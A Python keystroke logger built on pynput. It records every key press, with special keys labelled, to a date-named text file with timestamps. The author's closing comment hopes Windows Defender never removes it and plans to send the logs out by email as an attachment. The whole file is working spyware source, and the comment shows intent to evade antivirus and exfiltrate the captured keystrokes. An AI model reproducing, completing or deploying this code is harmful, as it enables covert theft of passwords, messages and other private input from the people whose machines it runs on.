from pynput.keyboard import Listener
import time
    
date = time.strftime("%A, %B %d, %Y") + ".txt"
x = time.ctime()

with open(date ,"a") as f: 
    f.write("\n")
    f.write("[" + x + "] : ")

def OnKeyboardEvent(event):
    global x
    event = str(event)
    event = event.replace("'", "")

    if event == "Key.enter":
        event = "\n"
        event = " {Enter} "
        with open(date ,"a") as f:
            f.write(f"{event}\n")
            f.write("[" + x + "] : ")

    elif event == "Key.space":
        event = " "
    
    elif event == "Key.backspace":
        event = " {BACKSPACE} "

    elif event == "Key.shift":
        event = " {L.SHIFT} "

    elif event == "Key.shift_r":
        event = " {R.SHIFT} "

    elif event == "Key.caps_lock":
        event = " {CAPSLOCK} "

    elif event == "Key.ctrl_l":
        event = " {L.CTRL} "

    elif event == "Key.ctrl_r":
        event = " {R.CTRL} "

    elif event == "Key.tab":
        event = " {TAB} "

    elif event == "Key.alt_l":
        event = " {L.ALT} "

    elif event == "Key.alt_gr":
        event = " {R.ALT} "

    elif event == "Key.up":
        event = " {UP.KEY} "

    elif event == "Key.left":
        event = " {LEFT.KEY} "

    elif event == "Key.down":
        event = " {DOWN.KEY} "

    elif event == "Key.right":
        event = " {RIGHT.KEY} "

    elif event == "Key.cmd":
        event = " {L.WINKEY} "

    elif event == "Key.cmd_r":
        event = " {R.WINKEY} "

    elif event == "Key.esc":
        event = " {ESC} "

    elif event == "Key.f1":
        event = " {F1} "

    elif event == "Key.f2":
        event = " {F2} "

    elif event == "Key.f3":
        event = " {F3} "

    elif event == "Key.f4":
        event = " {F4} "

    elif event == "Key.f5":
        event = " {F5} "

    elif event == "Key.f6":
        event = " {F6} "

    elif event == "Key.f7":
        event = " {F7} "

    elif event == "Key.f8":
        event = " {F8} "

    elif event == "Key.f9":
        event = " {F9} "

    elif event == "Key.f10":
        event = " {F10} "

    elif event == "Key.f11":
        event = " {F11} "

    elif event == "Key.f12":
        event = " {F12} "

    elif event == "Key.insert":
        event = " {INSERT} "

    elif event == "Key.delete":
        event = " {DELETE} "

    elif event == "Key.home":
        event = " {HOME} "

    elif event == "Key.page_up":
        event = " {PAGE.UP} "

    elif event == "Key.scroll_lock":
        event = " {SCROLL.LOCK} "

    elif event == "Key.pause":
        event = " {PAUSE.BREAK} "

    elif event == "Key.menu":
        event = " {MENU} "

    elif event == "Key.num_lock":
        event = " {NUM.LOCK} "

    with open(date ,"a") as f:
        f.write(event)

with Listener(on_press=OnKeyboardEvent) as listener:
    listener.join()

"""
needs to be improved in the next day hope windows defender never remove
this code

things to improve:

SENDS TO EMAIL AS ATTACHMENT
CAPS LOCK FEATURES
MATUTULOG NA MUNA AKO 8/17/2022 11:53 PM
"""